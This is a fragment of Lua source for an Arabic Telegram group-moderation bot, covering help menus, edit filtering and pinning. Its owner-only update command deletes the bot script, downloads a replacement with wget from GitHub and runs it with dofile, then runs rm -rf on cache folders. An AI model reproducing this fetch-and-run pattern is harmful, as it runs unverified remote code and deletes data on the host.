⌁︙قفل • فتح ↫ العربيه
⌁︙قفل • فتح ↫ الانجليزيه
⌁︙قفل • فتح ↫ الفارسيه
⌁︙قفل • فتح ↫ التفليش
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر حمايه اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙قفل • فتح + الامر ↫ ⤈
⌁︙التكرار بالطرد
⌁︙التكرار بالكتم
⌁︙التكرار بالتقييد
⌁︙الفارسيه بالطرد
⌁︙البوتات بالطرد
⌁︙البوتات بالتقييد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)
]]
Dev_Feras(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م2$") and Sudo(msg) or text and text:match("^تعيين امر م٢$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م2) الان " ,  1, "md")
DevFeras:set(DevFeras..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local Feras_dev =  DevFeras:get(DevFeras..'bot:help21'..msg.sender_user_id_..'')
if Feras_dev == 'msg' then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
DevFeras:set(DevFeras..'bot:help21'..msg.sender_user_id_..'', 'no')
DevFeras:set(DevFeras..'bot:help2', text)
Dev_Feras(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م2$") or text and text:match("^م٢$") or text and text:match("^اوامر2$") or text and text:match("^اوامر٢$") then
local help = DevFeras:get(DevFeras..'bot:help2')
local text =  [[
⌁︙اوامر الادمنيه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙الاعدادت
⌁︙تاك للكل 
⌁︙ضع وصف
⌁︙ضع صوره
⌁︙حذف الرابط
⌁︙حذف المطايه
⌁︙كشف البوتات
⌁︙طرد البوتات
⌁︙تنظيف + العدد
⌁︙تنظيف التعديل
⌁︙كللهم + الكلمه
⌁︙اسم البوت + الامر
⌁︙ضع • حذف ↫ ترحيب
⌁︙ضع • حذف ↫ قوانين
⌁︙اضف • حذف ↫ صلاحيه
⌁︙الصلاحيات • حذف الصلاحيات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙ضع رابط
⌁︙ضع سبام + العدد
⌁︙ضع تكرار + العدد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع مميز • تنزيل مميز
⌁︙المميزين • حذف المميزين
⌁︙كشف القيود • رفع القيود
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙حذف • مسح + بالرد
⌁︙منع • الغاء منع
⌁︙قائمه المنع
⌁︙حذف قائمه المنع
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ الحظر
⌁︙تفعيل • تعطيل ↫ الكتم
⌁︙تفعيل • تعطيل ↫ الرابط
⌁︙تفعيل • تعطيل ↫ الالعاب
⌁︙تفعيل • تعطيل ↫ الترحيب
⌁︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙طرد المحذوفين
⌁︙طرد ↫ بالرد • بالمعرف • بالايدي
⌁︙كتم • الغاء كتم
⌁︙تقييد • الغاء تقيد
⌁︙حظر • الغاء حظر
⌁︙المكتومين • حذف المكتومين
⌁︙المقيدين • حذف المقيدين
⌁︙المحظورين • حذف المحظورين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تقييد دقيقه + عدد الدقائق
⌁︙تقييد ساعه + عدد الساعات
⌁︙تقييد يوم + عدد الايام
⌁︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)
]]
Dev_Feras(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م3$") and Sudo(msg) or text and text:match("^تعيين امر م٣$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م3) الان " ,  1, "md")
DevFeras:set(DevFeras..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local Feras_dev =  DevFeras:get(DevFeras..'bot:help31'..msg.sender_user_id_..'')
if Feras_dev == 'msg' then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
DevFeras:set(DevFeras..'bot:help31'..msg.sender_user_id_..'', 'no')
DevFeras:set(DevFeras..'bot:help3', text)
Dev_Feras(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م3$") or text and text:match("^م٣$") or text and text:match("^اوامر3$") or text and text:match("^اوامر٣$") then
local help = DevFeras:get(DevFeras..'bot:help3')
local text =  [[
⌁︙اوامر المدراء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙فحص البوت
⌁︙ضع اسم + الاسم
⌁︙اضف • حذف ↫ رد
⌁︙ردود المدير
⌁︙حذف ردود المدير
⌁︙حذف قوائم المنع
⌁︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
⌁︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تنزيل الكل
⌁︙رفع ادمن • تنزيل ادمن
⌁︙الادمنيه • حذف الادمنيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تثبيت
⌁︙الغاء التثبيت
⌁︙اعاده التثبيت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تغير رد + اسم الرتبه + النص ↫ ⤈
⌁︙المطور • منشئ الاساسي
⌁︙المنشئ • المدير • الادمن
⌁︙المميز • المنظف • العضو
⌁︙حذف ردود الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تغيير الايدي ↫ لتغيير الكليشه
⌁︙تعيين الايدي ↫ لتعيين الكليشه
⌁︙حذف الايدي ↫ لحذف الكليشه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ اطردني
⌁︙تفعيل • تعطيل ↫ الايدي
⌁︙تفعيل • تعطيل ↫ ضافني
⌁︙تفعيل • تعطيل ↫ الابراج
⌁︙تفعيل • تعطيل ↫ الزخرفه
⌁︙تفعيل • تعطيل ↫ حساب العمر
⌁︙تفعيل • تعطيل ↫ ردود المطور
⌁︙تفعيل • تعطيل ↫ تنبيه التغيرات
⌁︙تفعيل • تعطيل ↫ الايدي بالصوره
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)
]]
Dev_Feras(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م4$") and Sudo(msg) or text and text:match("^تعيين امر م٤$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م4) الان " ,  1, "md")
DevFeras:set(DevFeras..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local Feras_dev =  DevFeras:get(DevFeras..'bot:help41'..msg.sender_user_id_..'')
if Feras_dev == 'msg' then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده" ,  1, "md")
DevFeras:set(DevFeras..'bot:help41'..msg.sender_user_id_..'', 'no')
DevFeras:set(DevFeras..'bot:help4', text)
Dev_Feras(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٤$") or text and text:match("^م4$") or text and text:match("^اوامر4$") or text and text:match("^اوامر٤$") then
local help = DevFeras:get(DevFeras..'bot:help4')
local text =  [[
⌁︙اوامر المنشئين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تنزيل الكل
⌁︙الميديا • امسح
⌁︙اضف • حذف ↫ امر
⌁︙حذف الاوامر المضافه
⌁︙الاوامر المضافه
⌁︙اضف نقاط ↫ بالرد • بالايدي
⌁︙اضف رسائل ↫ بالرد • بالايدي
⌁︙رفع منظف • تنزيل منظف
⌁︙المنظفين • حذف المنظفين
⌁︙رفع مدير • تنزيل مدير
⌁︙المدراء • حذف المدراء
⌁︙تفعيل • تعطيل ↫ الحظر
⌁︙تفعيل • تعطيل ↫ الكتم
⌁︙تفعيل • تعطيل ↫ نزلني
⌁︙تفعيل • تعطيل ↫ امسح
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ الرفع
⌁︙رفع منشئ • تنزيل منشئ
⌁︙المنشئين • حذف المنشئين
⌁︙رفع • تنزيل ↫ ادمن بالكروب
⌁︙رفع بكل الصلاحيات
⌁︙حذف القوائم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر منشئ المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع • تنزيل ↫ منشئ اساسي
⌁︙حذف المنشئين الاساسيين 
⌁︙المنشئين الاساسيين 
⌁︙حذف جميع الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)
]]
Dev_Feras(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م5$") and Sudo(msg) or text and text:match("^تعيين امر م٥$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م5) الان " ,  1, "md")
DevFeras:set(DevFeras..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local Feras_dev =  DevFeras:get(DevFeras..'bot:help51'..msg.sender_user_id_..'')
if Feras_dev == 'msg' then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
DevFeras:set(DevFeras..'bot:help51'..msg.sender_user_id_..'', 'no')
DevFeras:set(DevFeras..'bot:help5', text)
Dev_Feras(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٥$") or text and text:match("^م5$") or text and text:match("^اوامر5$") or text and text:match("^اوامر٥$") then
if not SudoBot(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمطورين فقط ', 1, 'md')
else
local help = DevFeras:get(DevFeras..'bot:help5')
local text =  [[
⌁︙اوامر المطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙القروبات
⌁︙المطورين
⌁︙المشتركين
⌁︙الاحصائيات
⌁︙المجموعات
⌁︙اسم البوت + غادر
⌁︙اسم البوت + تعطيل
⌁︙كشف + -ايدي المجموعه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع • تنزيل ↫ نائب مدير
⌁︙حذف • المدراء العامين 
⌁︙رفع • تنزيل ↫ ادمن عام
⌁︙حذف • الادمنيه العامين 
⌁︙رفع • تنزيل ↫ مميز عام
⌁︙حذف • المميزين عام 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المطور الاساسي ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تحديث
⌁︙السيرفر 
⌁︙روابط القروبات
⌁︙تحديث السورس
⌁︙تنظيف الرسائل 
⌁︙تنظيف القروبات
⌁︙تنظيف المشتركين
⌁︙ضع • حذف ↫ دعم
⌁︙تعيين الايدي العام
⌁︙غادر + -ايدي المجموعه
⌁︙تعيين عدد الاعضاء + العدد
⌁︙حظر عام • الغاء العام
⌁︙كتم عام • الغاء العام
⌁︙قائمه العام • حذف قائمه العام
⌁︙وضع • حذف ↫ اسم البوت
⌁︙اضف • حذف ↫ رد عام
⌁︙ردود المطور • حذف ردود المطور
⌁︙تعيين • حذف • جلب ↫ رد الخاص
⌁︙جلب نسخه القروبات
⌁︙رفع النسخه + بالرد على الملف
⌁︙تعيين • حذف ↫ قناة الاشتراك
⌁︙جلب كليشه الاشتراك
⌁︙تغيير • حذف ↫ كليشه الاشتراك
⌁︙رفع • تنزيل ↫ مطور
⌁︙المطورين • حذف المطورين
⌁︙تعيين • حذف ↫ كليشة الايدي
⌁︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ التنبيه
⌁︙تفعيل • تعطيل ↫ التواصل
⌁︙تفعيل • تعطيل ↫ المغادره
⌁︙تفعيل • تعطيل ↫ رد الخاص
⌁︙تفعيل • تعطيل ↫ البوت الخدمي
⌁︙تفعيل • تعطيل ↫ الاشتراك الاجباري
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)
]]
Dev_Feras(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end end
if text and text:match("^تعيين امر م6$") and Sudo(msg) or text and text:match("^تعيين امر م٦$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م6) الان " ,  1, "md")
DevFeras:set(DevFeras..'bot:help61'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local Feras_dev =  DevFeras:get(DevFeras..'bot:help61'..msg.sender_user_id_..'')
if Feras_dev == 'msg' then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده" ,  1, "md")
DevFeras:set(DevFeras..'bot:help61'..msg.sender_user_id_..'', 'no')
DevFeras:set(DevFeras..'bot:help6', text)
Dev_Feras(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
end
if text and text:match("^م٦$") or text and text:match("^م6$") or text and text:match("^اوامر6$") or text and text:match("^اوامر٦$") then
local help = DevFeras:get(DevFeras..'bot:help6')
local text =  [[
⌁︙اوامر الاعضاء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙السورس • موقعي • رتبتي • معلوماتي
⌁︙رسائلي • حذف رسائلي • اسمي • معرفي 
⌁︙ايدي •ايديي • جهاتي • المطايه • الالعاب 
⌁︙نقاطي • بيع نقاطي • القوانين • زخرفه 
⌁︙رابط الحذف • نزلني • اطردني • المطور 
⌁︙منو ضافني • مشاهدات المنشور • الرابط 
⌁︙ايدي المجموعه • معلومات المجموعه 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)
]]
Dev_Feras(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
--     Source DevFeras     --
if Sudo(msg) then
if text == "تحديث السورس" or text == "تحديث سورس" then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙جاري تحديث سورس فراس Feras', 1, 'md') 
os.execute('rm -rf DevFeras.lua') 
os.execute('wget https://raw.githubusercontent.com/iq0abs/DevFeras/master/DevFeras.lua') 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم التحديث الى الاصدار الجديد', 1, 'md') 
dofile('DevFeras.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
end
if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث ⌁' then  
dofile('DevFeras.lua')  
io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تحديث ملفات البوت", 1, "md")
end 
end 
--     Source DevFeras     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة المطور الان ", 1, "md")
DevFeras:setex(DevFeras.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف كليشة المطور", 1, "md")
DevFeras:del(DevFeras.."DevText")
end end
--     Source DevFeras     --
if DevFeras:get(DevFeras.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, "md") 
DevFeras:del(DevFeras.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevFeras:del(DevFeras.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevFeras:set(DevFeras..'bot:textch:user',texxt)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^تغيير كليشه الاشتراك الاجباري$") and Sudo(msg) or text and text:match("^تغيير كليشه الاشتراك$") and Sudo(msg) then  
DevFeras:setex(DevFeras.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local text = '⌁︙حسنا ارسل كليشة الاشتراك الجديده'  
Dev_Feras(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" then  
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevFeras:del(DevFeras..'bot:textch:user')
textt = "⌁︙تم حذف كليشة الاشتراك الاجباري"
Dev_Feras(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevFeras:get(DevFeras.."bot:textch:user")
if chtext then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙كليشة الاشتراك ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n['..chtext..']', 1, 'md')
else
local DevFeras6 = DevFeras:get(DevFeras.."DevFeras3")
if DevFeras6 then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عليك الاشتراك في قناة البوت \n⌁︙قناة البوت ↫ '..DevFeras6, 1, "html")
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين قناة الاشتراك الاجباري \n⌁︙ارسل (تعيين قناة الاشتراك) للتعيين ', 1, 'md')
end end end end
--     Source DevFeras     --
if text and text:match("^القناة$") or text and text:match("^قناة السورس$") or text and text:match("^قنات السورس$") then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ @Dev_Prox', 1, 'html')    
end 
--     Source DevFeras     --
if Sudo(msg) then 
if text == 'معلومات السيرفر' or text == 'السيرفر' then 
Dev_Feras(msg.chat_id_, msg.id_, 1, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '⌁︙نظام التشغيل ↫ ⤈\n`'"$linux_version"'`' 
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الذاكره العشوائيه ↫ ⤈\n`'"$memUsedPrc"'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الدخول ↫ ⤈\n`'`whoami`'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙مدة تشغيل السيرفر ↫ ⤈\n`'"$uptime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source DevFeras     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
DevFeras:incr(DevFeras..'bot:editmsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if result.id_ and result.content_.text_ then
DevFeras:set(DevFeras..'bot:editid'..result.id_,result.content_.text_)
end 
if DevFeras:get(DevFeras..'editmsg'..msg.chat_id_) and not Text and not Monsh(result.sender_user_id_, result.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local absname = '⌁︙العضو ↫ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')'
local absid = '⌁︙ايديه ↫ `'..dp.id_..'`'
local abstext = '⌁︙قام بالتعديل على الميديا'
local function cb(extra,result,success)
local admins = result.members_  
text = '\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for i=0 , #admins do 
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
text = text.."~ [@"..data.username_.."]\n"
if #admins == i then 
SendText(msg.chat_id_, absname..'\n'..absid..'\n'..abstext..text,0,'md') 
end
end,nil)
end
end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200,cb)
end,nil)
end
if not VipMem(result.sender_user_id_, result.chat_id_) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevFeras:get(DevFeras..'editmsg'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--     Source DevFeras     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = DevFeras:get(DevFeras..'pinnedmsgs'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevFeras:del(DevFeras..'pinnedmsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevFeras:del(DevFeras..'pinnedmsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevFeras:del(DevFeras..'pinnedmsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevFeras:del(DevFeras..'pinnedmsgs'..msg.chat_id_) end,nil)   
end end end
--     Source DevFeras     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local list = DevFeras:smembers(DevFeras..'bot:userss')  
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local list = DevFeras:smembers(DevFeras..'bot:groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=DevFeras,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevFeras:srem(DevFeras..'bot:groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevFeras:srem(DevFeras..'bot:groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevFeras:srem(DevFeras..'bot:groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevFeras:srem(DevFeras..'bot:groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
DevFeras:sadd(DevFeras..'bot:groups',v)  
end end,nil) end
end
--     Source DevFeras     --
end 
------------------------------------------------
-- Source Feras.--
--   Channel bot @dev_Feras .   --
--                - DevFeras -                 --
--        -- https://T.ME/DevFeras --         --
------------------------------------------------ 
